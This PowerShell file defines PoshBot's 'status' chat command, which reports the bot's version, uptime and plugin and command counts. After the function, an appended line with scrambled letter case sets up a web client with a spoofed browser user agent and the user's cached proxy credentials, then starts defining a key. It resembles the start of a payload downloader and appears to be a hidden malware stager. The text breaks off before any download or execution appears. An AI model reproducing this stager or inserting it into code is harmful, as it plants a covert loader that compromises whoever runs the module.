
function Get-PoshBotStatus {
    
    [PoshBot.BotCommand(
        CommandName = 'status',
        Permissions = 'view'
    )]
    [cmdletbinding()]
    param(
        [parameter(Mandatory)]
        $Bot
    )

    if ($Bot._Stopwatch.IsRunning) {
        $uptime = $Bot._Stopwatch.Elapsed.ToString()
    } else {
        $uptime = $null
    }
    $manifest = Import-PowerShellDataFile -Path "$PSScriptRoot/../../../PoshBot.psd1"
    $hash = [ordered]@{
        Version = $manifest.ModuleVersion
        Uptime = $uptime
        Plugins = $Bot.PluginManager.Plugins.Count
        Commands = $Bot.PluginManager.Commands.Count
        CommandsExecuted = $Bot.Executor.ExecutedCount
    }

    $status = [pscustomobject]$hash
    
    New-PoshBotCardResponse -Type Normal -Fields $hash -Title 'PoshBot Status'
}

$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

